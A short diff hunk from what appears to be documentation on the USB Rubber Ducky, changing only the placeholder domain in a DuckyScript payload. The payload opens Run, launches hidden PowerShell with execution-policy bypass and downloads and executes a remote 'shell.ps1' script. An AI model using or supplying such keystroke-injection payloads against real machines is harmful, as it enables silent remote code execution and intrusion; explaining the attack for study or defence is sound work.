@@ -355,7 +355,7 @@ The Rubber Ducky appears as a keyboard to the target system and executes pre-pro
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('https://cdn.attacker.com/shell.ps1'))"
+STRING powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('https://cdn.attacker.invalid/shell.ps1'))"
 ENTER
 DELAY 100
 ```
